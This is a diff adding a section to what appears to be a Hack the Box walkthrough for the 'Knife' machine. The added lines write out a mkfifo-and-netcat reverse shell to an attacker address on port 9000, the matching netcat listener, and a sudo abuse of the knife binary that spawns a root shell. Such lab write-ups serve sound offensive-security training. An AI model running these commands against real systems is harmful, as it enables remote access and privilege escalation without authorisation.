@@ -213,3 +213,17 @@ Privilege Escalation
 $ sudo -l
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b60d1e36-fb10-47a8-8d32-203b4583b59f)
+
+Shell Upgrade
+```shell
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 9000 >/tmp/f
+```
+```shell
+root@kali# rlwrap nc -nlvvp 9000
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b4d6915-1455-4ead-9aad-1faddb30614b)
+
+```shell
+james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ab69d83b-a224-4102-9e0f-8f5b89e88eb9)
